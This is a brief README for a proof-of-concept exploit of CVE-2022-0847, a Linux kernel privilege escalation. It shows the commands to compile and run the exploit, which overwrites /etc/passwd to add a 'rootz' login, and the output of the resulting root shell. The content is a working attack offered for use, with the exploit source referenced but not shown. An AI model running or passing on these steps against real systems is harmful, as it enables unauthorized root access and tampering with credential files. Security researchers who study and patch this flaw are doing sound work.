# CVE_2022_0847
CVE-2022-0847: Linux Kernel Privilege Escalation Vulnerability

---
## POC

A Simple Proof of concept to get root shell.

```bash
$ gcc cve_2022_0847.c -o exploit
$ ./exploit /etc/passwd 1 ootz:
$ su rootz
# id
uid=0(root) gid=0(root) groups=0(root)
```
